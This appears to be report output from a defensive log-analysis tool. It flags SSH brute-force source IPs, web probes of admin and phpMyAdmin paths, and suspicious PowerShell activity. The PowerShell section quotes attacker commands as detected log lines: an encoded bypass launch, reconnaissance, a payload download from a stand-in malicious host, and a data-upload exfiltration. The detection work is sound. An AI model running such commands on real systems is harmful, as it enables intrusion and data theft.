@@ -1,0 +1,168 @@
+﻿
+***** AUTH LOG ANALYSIS *****
+
+
+Suspicious SSH Brute Force Detection
+Suspicious IP: 190.178.62.6 - Number of attempts: 5 - Severity: HIGH - First attempt: Mar 27 18:27:18 - Last attempt: Mar 27 18:27:49
+Suspicious IP: 191.85.133.91 - Number of attempts: 4 - Severity: MEDIUM - First attempt: Mar 28 02:43:55 - Last attempt: Mar 28 02:44:02
+Suspicious IP: 186.133.159.181 - Number of attempts: 5 - Severity: HIGH - First attempt: Mar 28 09:20:48 - Last attempt: Mar 28 09:21:18
+Suspicious IP: 218.60.136.106 - Number of attempts: 4 - Severity: MEDIUM - First attempt: Mar 28 09:24:03 - Last attempt: Mar 29 23:18:33
+Suspicious IP: 85.245.107.41 - Number of attempts: 11 - Severity: HIGH - First attempt: Mar 29 13:07:15 - Last attempt: Mar 31 07:05:46
+Suspicious IP: 181.25.206.27 - Number of attempts: 14 - Severity: HIGH - First attempt: Mar 29 14:15:41 - Last attempt: Mar 29 14:16:23
+Suspicious IP: 24.151.103.17 - Number of attempts: 157 - Severity: HIGH - First attempt: Mar 29 17:48:33 - Last attempt: Mar 30 16:01:35
+Suspicious IP: 106.57.58.19 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Mar 30 02:06:41 - Last attempt: Mar 30 02:06:53
+Suspicious IP: 181.23.168.176 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Mar 30 03:08:11 - Last attempt: Mar 30 03:08:21
+Suspicious IP: 181.25.201.155 - Number of attempts: 10 - Severity: HIGH - First attempt: Mar 30 21:54:04 - Last attempt: Mar 30 21:54:28
+Suspicious IP: 111.40.168.90 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Mar 30 22:00:40 - Last attempt: Mar 30 22:00:51
+Suspicious IP: 122.189.198.238 - Number of attempts: 7 - Severity: HIGH - First attempt: Mar 31 01:35:16 - Last attempt: Mar 31 01:35:28
+Suspicious IP: 60.187.118.40 - Number of attempts: 7 - Severity: HIGH - First attempt: Mar 31 06:34:38 - Last attempt: Mar 31 06:34:49
+Suspicious IP: 122.191.89.89 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Mar 31 10:36:16 - Last attempt: Mar 31 10:36:28
+Suspicious IP: 42.184.142.151 - Number of attempts: 7 - Severity: HIGH - First attempt: Mar 31 11:06:39 - Last attempt: Mar 31 11:06:50
+Suspicious IP: 82.64.2.59 - Number of attempts: 7 - Severity: HIGH - First attempt: Mar 31 14:15:40 - Last attempt: Mar 31 14:15:50
+Suspicious IP: 114.32.100.101 - Number of attempts: 7 - Severity: HIGH - First attempt: Mar 31 22:57:33 - Last attempt: Mar 31 22:57:44
+Suspicious IP: 122.244.28.82 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  1 05:46:42 - Last attempt: Apr  1 05:46:54
+Suspicious IP: 123.153.146.183 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  1 18:08:16 - Last attempt: Apr  1 18:08:27
+Suspicious IP: 181.26.186.35 - Number of attempts: 32 - Severity: HIGH - First attempt: Apr  1 18:22:17 - Last attempt: Apr  1 18:22:45
+Suspicious IP: 183.152.79.79 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  1 20:38:36 - Last attempt: Apr  1 20:38:49
+Suspicious IP: 1.30.211.144 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  1 21:27:51 - Last attempt: Apr  1 21:28:02
+Suspicious IP: 5.167.75.191 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  1 22:52:10 - Last attempt: Apr  1 22:52:21
+Suspicious IP: 93.120.176.237 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  2 17:03:45 - Last attempt: Apr  2 17:03:54
+Suspicious IP: 78.106.21.86 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  2 19:51:57 - Last attempt: Apr  2 19:52:08
+Suspicious IP: 112.251.168.248 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  3 14:51:37 - Last attempt: Apr  3 14:51:49
+Suspicious IP: 119.193.140.176 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  3 22:52:29 - Last attempt: Apr  3 22:52:40
+Suspicious IP: 58.19.144.50 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  3 22:53:15 - Last attempt: Apr  3 22:53:28
+Suspicious IP: 122.112.235.133 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  4 01:13:31 - Last attempt: Apr  4 01:13:41
+Suspicious IP: 122.189.193.214 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  4 03:50:45 - Last attempt: Apr  4 03:50:55
+Suspicious IP: 49.4.143.105 - Number of attempts: 60 - Severity: HIGH - First attempt: Apr  5 07:11:17 - Last attempt: Apr  5 07:28:02
+Suspicious IP: 61.166.73.66 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  5 07:45:27 - Last attempt: Apr  5 07:45:38
+Suspicious IP: 122.191.88.115 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  5 15:03:36 - Last attempt: Apr  5 15:03:47
+Suspicious IP: 186.130.83.53 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  5 21:33:35 - Last attempt: Apr  5 21:33:46
+Suspicious IP: 123.96.5.168 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  5 23:52:43 - Last attempt: Apr  5 23:52:53
+Suspicious IP: 111.40.30.206 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  6 02:28:25 - Last attempt: Apr  6 02:28:37
+Suspicious IP: 188.18.252.218 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  6 13:35:10 - Last attempt: Apr  6 13:35:22
+Suspicious IP: 125.107.136.165 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  6 14:19:18 - Last attempt: Apr  6 14:19:29
+Suspicious IP: 190.107.182.33 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  6 15:56:53 - Last attempt: Apr  6 15:57:05
+Suspicious IP: 112.101.164.200 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  6 16:37:21 - Last attempt: Apr  6 16:37:35
+Suspicious IP: 34.204.227.175 - Number of attempts: 43 - Severity: HIGH - First attempt: Apr  6 20:48:27 - Last attempt: Apr  6 20:52:19
+Suspicious IP: 223.244.185.76 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  6 21:53:03 - Last attempt: Apr  6 21:53:14
+Suspicious IP: 182.243.87.6 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  6 22:59:12 - Last attempt: Apr  6 22:59:24
+Suspicious IP: 91.243.236.123 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  7 00:08:34 - Last attempt: Apr  7 00:08:45
+Suspicious IP: 49.4.143.5 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  7 08:36:34 - Last attempt: Apr  7 08:36:49
+Suspicious IP: 222.89.76.13 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  7 18:34:04 - Last attempt: Apr  7 18:34:15
+Suspicious IP: 191.81.42.216 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  7 20:44:47 - Last attempt: Apr  7 20:44:59
+Suspicious IP: 183.93.215.158 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  7 22:54:09 - Last attempt: Apr  7 22:54:21
+Suspicious IP: 122.190.143.18 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  8 00:33:33 - Last attempt: Apr  8 00:33:45
+Suspicious IP: 61.183.117.250 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  8 18:21:11 - Last attempt: Apr  8 18:21:22
+Suspicious IP: 123.120.200.51 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  8 18:58:28 - Last attempt: Apr  8 18:58:40
+Suspicious IP: 73.231.4.205 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  9 00:35:55 - Last attempt: Apr  9 00:36:04
+Suspicious IP: 110.78.174.75 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  9 03:17:14 - Last attempt: Apr  9 03:17:25
+Suspicious IP: 49.4.143.181 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  9 03:55:31 - Last attempt: Apr  9 03:55:43
+Suspicious IP: 186.128.141.232 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  9 14:56:18 - Last attempt: Apr  9 14:56:29
+Suspicious IP: 46.89.129.145 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  9 14:57:49 - Last attempt: Apr  9 14:58:00
+Suspicious IP: 59.174.52.12 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  9 15:08:53 - Last attempt: Apr  9 15:09:28
+Suspicious IP: 103.230.120.26 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr  9 16:50:57 - Last attempt: Apr  9 16:51:07
+Suspicious IP: 122.189.197.241 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr  9 20:28:49 - Last attempt: Apr  9 20:29:00
+Suspicious IP: 123.119.111.172 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 10 00:33:43 - Last attempt: Apr 10 00:33:55
+Suspicious IP: 123.164.142.82 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 10 08:03:46 - Last attempt: Apr 10 08:03:58
+Suspicious IP: 175.162.187.121 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 10 19:42:04 - Last attempt: Apr 10 19:42:16
+Suspicious IP: 60.165.208.28 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 10 22:43:25 - Last attempt: Apr 10 22:43:38
+Suspicious IP: 218.91.34.237 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 11 06:07:47 - Last attempt: Apr 11 06:07:58
+Suspicious IP: 49.84.87.84 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 11 06:13:37 - Last attempt: Apr 11 06:13:49
+Suspicious IP: 222.187.86.51 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 11 13:47:08 - Last attempt: Apr 11 13:47:19
+Suspicious IP: 77.231.252.103 - Number of attempts: 5 - Severity: HIGH - First attempt: Apr 11 14:03:16 - Last attempt: Apr 11 14:03:40
+Suspicious IP: 95.190.198.34 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 11 17:14:15 - Last attempt: Apr 11 17:14:25
+Suspicious IP: 94.154.25.149 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 12 03:37:56 - Last attempt: Apr 12 03:38:07
+Suspicious IP: 183.146.159.20 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 12 06:54:39 - Last attempt: Apr 12 06:54:51
+Suspicious IP: 126.59.251.31 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 12 11:49:34 - Last attempt: Apr 12 11:49:46
+Suspicious IP: 222.186.56.220 - Number of attempts: 8 - Severity: HIGH - First attempt: Apr 13 01:55:44 - Last attempt: Apr 13 01:56:05
+Suspicious IP: 183.93.253.159 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 13 02:54:54 - Last attempt: Apr 13 02:55:06
+Suspicious IP: 219.82.145.223 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 13 03:54:53 - Last attempt: Apr 13 03:55:05
+Suspicious IP: 122.163.61.218 - Number of attempts: 35 - Severity: HIGH - First attempt: Apr 13 04:25:37 - Last attempt: Apr 13 04:26:17
+Suspicious IP: 14.54.210.101 - Number of attempts: 14 - Severity: HIGH - First attempt: Apr 13 07:23:18 - Last attempt: Apr 13 07:23:29
+Suspicious IP: 105.101.221.33 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 13 11:42:23 - Last attempt: Apr 13 11:42:32
+Suspicious IP: 37.110.24.51 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 13 19:31:21 - Last attempt: Apr 13 19:31:31
+Suspicious IP: 181.25.189.115 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 14 04:15:24 - Last attempt: Apr 14 04:15:37
+Suspicious IP: 178.219.248.139 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 14 05:01:34 - Last attempt: Apr 14 05:01:43
+Suspicious IP: 177.38.145.209 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 14 05:11:20 - Last attempt: Apr 14 05:11:32
+Suspicious IP: 191.83.152.32 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 14 08:24:53 - Last attempt: Apr 14 08:25:06
+Suspicious IP: 170.79.155.119 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 14 08:33:00 - Last attempt: Apr 14 08:33:12
+Suspicious IP: 46.30.160.83 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 14 08:38:36 - Last attempt: Apr 14 08:38:46
+Suspicious IP: 201.178.245.106 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 15 01:56:21 - Last attempt: Apr 15 01:56:32
+Suspicious IP: 181.211.173.182 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 15 04:23:45 - Last attempt: Apr 15 04:23:56
+Suspicious IP: 122.144.136.83 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 15 23:19:20 - Last attempt: Apr 15 23:19:30
+Suspicious IP: 1.189.205.173 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 03:45:25 - Last attempt: Apr 16 03:45:36
+Suspicious IP: 181.23.26.185 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 06:15:10 - Last attempt: Apr 16 06:15:21
+Suspicious IP: 201.27.216.125 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 16:19:04 - Last attempt: Apr 16 16:19:15
+Suspicious IP: 179.208.151.103 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 20:18:37 - Last attempt: Apr 16 20:18:48
+Suspicious IP: 119.193.140.203 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 21:17:14 - Last attempt: Apr 16 21:17:26
+Suspicious IP: 182.243.85.75 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 22:09:19 - Last attempt: Apr 16 22:09:30
+Suspicious IP: 61.174.116.31 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 16 22:50:07 - Last attempt: Apr 16 22:50:19
+Suspicious IP: 111.40.166.130 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 17 14:13:45 - Last attempt: Apr 17 14:13:57
+Suspicious IP: 186.129.147.223 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 17 20:11:05 - Last attempt: Apr 17 20:11:17
+Suspicious IP: 37.78.105.176 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 17 20:53:34 - Last attempt: Apr 17 20:53:45
+Suspicious IP: 58.100.135.31 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 18 03:12:36 - Last attempt: Apr 18 03:12:47
+Suspicious IP: 221.194.44.190 - Number of attempts: 6 - Severity: HIGH - First attempt: Apr 18 15:00:53 - Last attempt: Apr 18 15:06:56
+Suspicious IP: 178.161.33.80 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 18 18:47:29 - Last attempt: Apr 18 18:47:39
+Suspicious IP: 179.38.76.250 - Number of attempts: 7 - Severity: HIGH - First attempt: Apr 19 04:37:49 - Last attempt: Apr 19 04:38:01
+Suspicious IP: 186.47.222.98 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 19 10:12:20 - Last attempt: Apr 19 10:12:30
+Suspicious IP: 201.178.81.113 - Number of attempts: 38 - Severity: HIGH - First attempt: Apr 19 17:12:41 - Last attempt: Apr 19 17:13:24
+Suspicious IP: 68.182.39.76 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 20 03:06:39 - Last attempt: Apr 20 03:06:50
+Suspicious IP: 122.5.240.60 - Number of attempts: 3 - Severity: MEDIUM - First attempt: Apr 20 13:50:51 - Last attempt: Apr 20 13:51:02
+
+Total Number of Suspicious IPs: 105
+Total Number of High Severity IPs: 50
+Total Number of Medium Severity IPs: 55
+
+
+***** IOC ANALYSIS *****
+
+
+=== IOC Match Detection ===
+High Alert, Suspicious IOC IP and Path: 203.0.113.5 - /admin
+Log entry: 203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+
+High Alert, Suspicious IOC IP and Path: 203.0.113.5 - /phpmyadmin
+Log entry: 203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+
+High Alert, Suspicious IOC IP and Path: 203.0.113.5 - /phpmyadmin
+Log entry: 203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+
+Medium Alert, Suspicious IOC IP detected: 198.51.100.8
+Log entry: 198.51.100.8 - - [15/Jul/2009:15:50:51 -0700] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+
+High Alert, Suspicious IOC IP and Path: 198.51.100.8 - /wp-admin
+Log entry: 198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+Medium Alert, Suspicious IOC IP detected: 198.51.100.8
+Log entry: 198.51.100.8 - - [15/Jul/2009:15:50:53 -0700] "GET /wp-login.php HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+
+High Alert, Suspicious IOC IP and Path: 198.51.100.8 - /wp-admin
+Log entry: 198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+High Alert, Suspicious IOC IP and Path: 198.51.100.8 - /wp-admin
+Log entry: 198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+Total suspicious events: 8
+The total High Alert are: 6
+The total Medium Alert for IPs are: 2
+The total Medium Alert for Paths are: 0
+
+
+***** POWERSHELL ANALYSIS *****
+
+
+*** Suspicious PowerShell Activity Detection ***
+Suspicious Start: 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA... - Severity: HIGH
+Reconnaissance: 2025-02-01 10:03:01 whoami - Severity: MEDIUM
+Reconnaissance: 2025-02-01 10:03:10 ipconfig - Severity: MEDIUM
+Reconnaissance: 2025-02-01 10:03:44 net user - Severity: MEDIUM
+Suspicious secure download: 2025-02-01 10:03:55 powershell.exe -Command Invoke-WebRequest https://microsoft.com/update.exe - Severity: MEDIUM
+Malicious download: 2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe - Severity: HIGH
+Collection: 2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip - Severity: MEDIUM
+Exfiltration: 2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip - Severity: HIGH
+
+Total Number of Suspicious PowerShell or Malicious Logs: 8
+Total Number of Suspicious Secure Downloads: 1
+Total Number of High Alerts: 3
+Total Number of Medium Alerts: 5
+
